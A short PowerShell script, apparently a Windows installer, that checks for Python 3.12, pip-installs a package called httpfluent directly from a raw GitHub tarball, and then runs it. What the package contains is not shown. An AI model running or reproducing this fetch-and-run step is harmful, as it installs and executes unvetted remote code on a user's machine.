# ===================================================
# Python 3.12.6 + httpfluent (STAY OPEN MODE)
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"

Write-Host "--- STEP 1: ENVIRONMENT CHECK ---" -ForegroundColor Cyan
if (Test-Path $PythonExe) {
    Write-Host "[+] Python executable found at $PythonExe" -ForegroundColor Green
    $ExecutableToUse = $PythonExe
} else {
    Write-Host "[-] Python NOT found in $InstallDir. Install is required." -ForegroundColor Yellow
}
Read-Host "Press Enter to continue..."

Write-Host "--- STEP 2: INSTALLING PACKAGES ---" -ForegroundColor Cyan
if ($ExecutableToUse) {
    Write-Host "[*] Trying to install httpfluent..."
    & $ExecutableToUse -m pip install requests
    & $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"
} else {
    Write-Host "[!] Cannot install packages: Python not found!" -ForegroundColor Red
}
Read-Host "Press Enter to continue..."

Write-Host "--- STEP 3: THE COMMAND TEST ---" -ForegroundColor Cyan
Write-Host "[*] Refreshing Path for this window..."
$env:Path += ";$InstallDir;$InstallDir\Scripts"

Write-Host "[*] Running command: httpfluent" -ForegroundColor Yellow
Write-Host "-------------------------------------------"
try {
    # Run directly in this window so we see the error
    httpfluent
} catch {
    Write-Host "[!] ERROR: The command 'httpfluent' failed." -ForegroundColor Red
    Write-Host "Details: $($_.Exception.Message)"
}
Write-Host "-------------------------------------------"

Read-Host "SCRIPT FINISHED. Press Enter to close this window..."
